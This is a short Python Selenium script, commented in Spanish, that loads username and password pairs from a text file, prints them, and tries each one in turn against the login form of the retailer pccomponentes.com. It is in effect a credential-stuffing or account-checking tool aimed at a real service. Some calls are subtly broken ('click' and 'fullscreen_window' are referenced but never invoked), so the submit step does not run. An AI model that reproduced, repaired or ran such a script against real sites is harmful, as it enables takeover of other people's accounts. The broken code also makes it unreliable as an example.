from time import sleep
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait



User= [""]
Pass= [""]
data=[""]
data.clear()
User.clear()
Pass.clear()
filepath = 'User.txt'
contador=0
with open(filepath) as fp:
    line=fp.readline()
    while line:
        data = line.split("|")
        User.append(data[0].strip('\n')) 
        Pass.append(data[1].strip('\n'))
        line = fp.readline()
        contador+=1
print(contador)
print(User,"\n") 
print(Pass,"\n")


driver = webdriver.Chrome(ChromeDriverManager().install())
for x in range(contador):
    driver.fullscreen_window
    driver.get('https://www.pccomponentes.com/login')
    imput_user= driver.find_element(By.XPATH,'//*[@id="username"]')
    imput_pass= driver.find_element(By.XPATH,'//*[@id="password"]')
    imput_buton= driver.find_element(By.XPATH,'//*[@id="login-form"]/button[2]')

    print("             ", User[x]," : ", Pass[x], "\n")
    print("Ingresando Usuario.... \n")
    imput_user.send_keys(User[x])
    sleep(2)
    print("Ingresando password.... \n")
    imput_pass.send_keys(Pass[x])
    sleep(2)
    imput_buton.click
    print("Enviando peticion.... \n")
    sleep(2)
    WebDriverWait(driver,5)
